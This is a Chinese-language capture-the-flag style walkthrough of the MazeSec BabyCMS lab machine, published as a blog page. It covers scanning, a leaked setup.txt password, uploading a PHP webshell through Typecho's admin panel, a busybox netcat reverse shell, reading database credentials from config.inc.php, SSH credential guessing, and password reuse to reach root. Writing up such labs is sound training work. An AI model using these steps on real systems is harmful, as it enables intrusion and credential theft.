@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec BabyCMS</title>
+        <meta name="description" content="靶机说明 关键词：Typecho 后台 Getshell、配置文件信息泄露、MySQL 凭证提取、密码复用、SSH 登录 摘要：本文记录了 MazeSec BabyCMS 靶机的渗透过程。选手通过目录扫描发现暴露的 setup.txt 文件，获取 Typecho 后台初始凭证并成功登录 root 用户后台；通过修改配置…">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-babycms/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec BabyCMS">
+    <meta property="og:description" content="靶机说明 关键词：Typecho 后台 Getshell、配置文件信息泄露、MySQL 凭证提取、密码复用、SSH 登录 摘要：本文记录了 MazeSec BabyCMS 靶机的渗透过程。选手通过目录扫描发现暴露的 setup.txt 文件，获取 Typecho 后台初始凭证并成功登录 root 用户后台；通过修改配置…">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-babycms/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-babycms/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec BabyCMS">
+    <meta name="twitter:description" content="靶机说明 关键词：Typecho 后台 Getshell、配置文件信息泄露、MySQL 凭证提取、密码复用、SSH 登录 摘要：本文记录了 MazeSec BabyCMS 靶机的渗透过程。选手通过目录扫描发现暴露的 setup.txt 文件，获取 Typecho 后台初始凭证并成功登录 root 用户后台；通过修改配置…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-babycms/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec BabyCMS</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-10 22:57</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机说明</h2>
+<p><strong>关键词</strong>：Typecho 后台 Getshell、配置文件信息泄露、MySQL 凭证提取、密码复用、SSH 登录</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec BabyCMS 靶机的渗透过程。选手通过目录扫描发现暴露的 setup.txt 文件，获取 Typecho 后台初始凭证并成功登录 root 用户后台；通过修改配置开启 PHP 文件上传功能，在文章中上传 PHP Webshell 实现代码执行，获取 www-data 权限；在 Web 目录下读取 Typecho 配置文件 config.inc.php，提取 MySQL 数据库凭证后登录数据库，从自定义用户表中枚举到多个账号及哈希值；通过 SSH 服务对枚举出的账号密码进行组合爆破，成功以 caigou 用户身份登录系统；最终利用密码复用特性，直接使用 caigou 的凭证切换至 root 用户完成权限提升。该靶机重点考察了 CMS 配置文件泄露、数据库信息提取以及横向移动中的密码复用风险。</p>
+<h2>信息收集</h2>
+<h3>存活主机发现与 ARP 扫描</h3>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyCMS]
+└─$ sudo arp-scan -I eth1 192.168.56.0/24
+
+192.168.56.126  08:00:27:27:bb:b4       PCS Systemtechnik GmbH</code></pre>
+<h3>端口扫描</h3>
+<p>TCP 全端口扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyCMS]
+└─$ nmap -p- -sT 192.168.56.126
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+<h3>80 端口服务探测</h3>
+<p>有一个 Typecho 博客系统</p>
+<p><img src="/images/maze-babycms/1.png" alt="" decoding="async" width="1004" height="821"></p>
+<p>尝试几次弱口令无果，gobuster 目录扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyCMS]
+└─$ gobuster dir -u http://192.168.56.126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,asp,txt,bak
+
+/setup.txt            (Status: 200) [Size: 26]</code></pre>
+<p>访问 setup.txt，是 Typecho 的凭证信息</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyCMS]
+└─$ curl http://192.168.56.126/setup.txt
+pass:dyxBCEjovrUJa84sV03Q</code></pre>
+<h2>后台getshell</h2>
+<p>首页有信息 可以确定存在用户 <code>root</code>，使用 root:dyxBCEjovrUJa84sV03Q 成功登录后台，设置允许php文件上传</p>
+<p><img src="/images/maze-babycms/2.png" alt="" decoding="async" loading="lazy" width="566" height="293"></p>
+<p><img src="/images/maze-babycms/3.png" alt="" decoding="async" loading="lazy" width="1193" height="684"></p>
+<p>文章上传php附件</p>
+<p><img src="/images/maze-babycms/4.png" alt="" decoding="async" loading="lazy" width="1735" height="731"></p>
+<p>域名替换为ip，访问webshell</p>
+<p><img src="/images/maze-babycms/5.png" alt="" decoding="async" loading="lazy" width="903" height="289"></p>
+<p>反弹个shell到攻击机</p>
+<pre><code class="language-bash">busybox nc 192.168.56.126 -e bash</code></pre>
+<h2>收集 mysql 凭证</h2>
+<p>查看当前开放的端口</p>
+<pre><code class="language-bash">www-data@BabyCMS:/var/www/html/usr/uploads/2025/11$ ss -tupln
+Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
+udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
+tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
+tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*      
+tcp     LISTEN   0        128                 [::]:22               [::]:*      
+tcp     LISTEN   0        128                    *:80                  *:*  </code></pre>
+<p>找到 typecho 的配置文件 config.inc.php，查看 mysql 凭证</p>
+<pre><code class="language-bash">www-data@BabyCMS:/var/www/html/usr/uploads/2025/11$ cd /var/www/html
+www-data@BabyCMS:/var/www/html$ ls
+LICENSE.txt  config.inc.php  install      setup.txt    usr
+admin        index.php       install.php  typecho.zip  var
+www-data@BabyCMS:/var/www/html$ cat config.inc.php 
+// config db
+$db = new \Typecho\Db('Pdo_Mysql', 'typecho_');
+$db-&gt;addServer(array (
+  'host' =&gt; 'localhost',
+  'port' =&gt; 3306,
+  'user' =&gt; 'pagekit_user',
+  'password' =&gt; 'your_secure_password',
+  'charset' =&gt; 'utf8mb4',
+  'database' =&gt; 'pagekit',
+  'engine' =&gt; 'InnoDB',
+  'sslCa' =&gt; NULL,
+  'sslVerify' =&gt; false,
+), \Typecho\Db::READ | \Typecho\Db::WRITE);
+\Typecho\Db::set($db);</code></pre>
+<h2>mysql 信息收集</h2>
+<p>使用收集到的 mysql 凭证登录 mysql，可以在 pagekit.typecho_userlist表里找到一个疑似 <code>caigou</code> 用户的凭证</p>
+<pre><code class="language-bash">MariaDB [pagekit]&gt; select * from typecho_userlist;
++----+--------+----------------------+
+| id | name   | pass                 |
++----+--------+----------------------+
+|  1 | caigou | dRfGtYhUjIkOlPqAeRtY |
+|  2 | user1  | aBcDeFgHiJkLmNoPqRsT |
+|  3 | user2  | cNNloFLE88YBIP4ZJfcy |
+|  4 | user3  | xYzAbCdEfGhIjKlMnOpQ |
+|  5 | user4  | pLmOkNjIbHvGcFxDrEsW |
+|  6 | user5  | wVxYzAbCdEfGhIjKlMnO |
+|  7 | user6  | sTrUvWxYzAbCdEfGhIjK |
+|  8 | user7  | qWeRtYuIoPaSdFgHjKlZ |
+|  9 | user8  | mNbVcXzAsDfGhJkLpOqR |
+| 10 | user9  | kJiHgFdSaPqOwNeMtBuV |
++----+--------+----------------------+
+10 rows in set (0.000 sec)</code></pre>
+<p>使用 caigou:dRfGtYhUjIkOlPqAeRtY 登录 ssh，密码错误</p>
+<p><img src="/images/maze-babycms/6.png" alt="" decoding="async" loading="lazy" width="442" height="128"></p>
+<p>测试 <code>caigou</code> 用户与其他密码组合时，在<code>caigou:cNNloFLE88YBIP4ZJfcy</code> 时成功登录 ssh</p>
+<p><img src="/images/maze-babycms/7.png" alt="" decoding="async" loading="lazy" width="720" height="320"></p>
+<h2>密码复用</h2>
+<p>尝试使用 caigou 用户凭证登录 root ，成功登录root</p>
+<p><img src="/images/maze-babycms/8.png" alt="" decoding="async" loading="lazy" width="564" height="173"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#typecho</span>
+                                    <span>#密码复用</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
